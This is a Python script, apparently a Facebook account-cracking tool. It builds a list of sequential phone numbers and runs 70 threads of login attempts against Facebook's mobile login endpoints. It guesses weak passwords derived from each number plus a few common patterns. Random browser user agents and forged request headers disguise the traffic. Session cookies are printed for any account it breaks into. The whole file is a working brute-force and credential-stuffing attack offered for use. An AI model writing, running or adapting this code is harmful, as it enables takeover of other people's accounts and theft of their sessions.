import os, re, sys, uuid, random, requests, time, json
import string
from concurrent.futures import ThreadPoolExecutor as ThreadPool


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def ua():
    rr = random.randint
    aZ = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
    return xx

def lsb():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
    number = ''.join(random.choices(string.digits, k=1))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)

def referer():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
    number = ''.join(random.choices(string.digits, k=5))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)

loop = 0
oks = []

# ----------CK Update----------#

agent = "Mozilla/5.0 (Linux; Android 12; CPH2095 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36"
# -----GRAPH


# ---HOST

# ----------CK Update----------#


user = []

# fb = ""  # mbasic, touch, free, m, x, p


def main():

    inp = int(input("How many do want to chek? -> "))
    print("Give you number ex: 01850819272")
    code=input("Put your number -> ")

    for i in range(inp):
        # gg=str(random.choice(range(10000000,99999999)))
        gg = str(int(code) + i)
        user.append(gg)

    print(" Method 1")
    print(" Method 2")
    print(" Method 3")
    print(" Method 4")
    print(" Method 5")
    print(" Method 6 Normal(Best)")
    meth = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    if meth in ["1", "a", "A"]:
        fb = "m"
    elif meth in ["2", "b", "B"]:
        fb = "x"
    elif meth in ["3", "c", "C"]:
        fb = "p"
    elif meth in ["4", "d", "D"]:
        fb = "touch"
    elif meth in ["5", "e", "E"]:
        fb = "free"
    else:
        fb = "mbasic"
    with ThreadPool(max_workers=70) as update:

        for xd in user:
            uid = "0" + xd

            pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####"]

            update.submit(host, uid, pwx, meth, fb)


# -----------m1-----------#

def host(uid, pwx, meth, fb):
    global oks, loop, user
    session = requests.Session()
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[SHADID-M{meth}]   {loop}⟩\x1b[38;5;155m{str(len(user))}\r "),
    sys.stdout.flush()

    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                    "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
            uax = windows()
            ver1 = str(random.randrange(1, 99))
            ver2 = str(random.randrange(90, 121))
            lsd = lsb()
            refer = referer()
            dpr = str(random.randrange(2, 6))
            sceme = random.choice(['light', 'dark'])
            had = {
                'Host': f'{fb}.facebook.com',
                'content-length': str(random.randrange(1600, 1800, 10)),
                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
                'sec-ch-ua-mobile': '?1',
                'user-agent': uax,
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': lsd,
                'viewport-width': '360',
                'sec-ch-ua-platform-version': '""',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'dpr': dpr,
                'sec-ch-ua-full-version-list': '',
                'sec-ch-ua-model': '""',
                'sec-ch-prefers-color-scheme': sceme,
                'sec-ch-ua-platform': '"Android"',
                'accept': '*/*',
                'origin': f'https://{fb}.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
                'accept-encoding': 'gzip, deflate, br,',
                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url, data=info, headers=had)
            heron_brand = session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                xx = coki.split("c_user=")[1]
                xd = xx[:15]
                print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")

                break
            elif "checkpoint" in heron_brand:
                print(f"\r\r[UNSUCCESSFUL] {xd} <> {ps}\n")

                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
            else:
                continue
        loop += 1
    except Exception as e:
        time.sleep(30)


main()
